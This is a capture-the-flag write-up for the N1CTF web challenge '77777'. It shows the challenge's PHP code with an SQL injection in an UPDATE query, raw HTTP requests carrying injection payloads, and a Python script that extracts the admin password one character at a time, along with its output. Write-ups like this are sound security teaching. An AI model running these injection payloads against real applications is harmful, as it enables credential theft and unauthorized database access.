## 77777 (Web, 104pt)

> "77777" is my girlfriend's nickname，have fun xdd:)
> 
> hk node: http://47.75.14.48
> 
> cn node: http://47.97.168.223
> 
> (Two challenge servers are identical, use either of them.)

In the About tab we see the following.

```
U can update my points in Profile.

and And the flag is `admin's password`:)
```

There was a Somecode tab that gave us the following code.

```php
function update_point($p, $points){
    global $link;
    $q = sprintf("UPDATE users SET points=%d%s, $p, waf($points)");
    if(!$query = mysqli_query($link, $q)) return FALSE;
    return TRUE;
}
if(!update_point($_POST['flag'], $_POST['hi']))
    echo 'sorry';
```

It seems like a straight-forward SQL injection in the `UPDATE` statement and we can extract data from the Profile tab. So, the only black-box here is the `waf()` method. After fuzzing the vulnerable request to see what character limitations had been put in place, there were actually none. Only some functions were filtered. Initially, we retrieve the length of the password.

```
POST / HTTP/1.1
Host: 47.75.14.48
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Connection: close

flag=1&hi=*length(password)
```

Knowing the length, we can retrieve full password using a payload such as:

```
flag=1&hi=*ord(substr(password,INDEX,1))
```

The solution is automated in the [solve.py](solve.py) script.

```python
import re
import requests

_target = 'http://47.75.14.48/'

flag = ''
for i in range(1,16):
    d = {'flag': '1', 'hi': '*ord(substr(password,{},1))'.format(i)}
    resp = requests.post(_target, data=d)
    flag += chr(int(re.search(r'<grey>My Points</grey> \| ([0-9]+)<br/>', resp.text).group(1).strip()))
    print flag

print '[+] flag: N1CTF{{{}}}'.format(flag)
```

```
❯❯❯ python solve.py
h
he
hel
hell
hello
helloc
helloct
helloctf
helloctfe
helloctfer
helloctfer2
helloctfer23
helloctfer233
helloctfer2333
helloctfer23333
[+] flag: N1CTF{helloctfer23333}
```
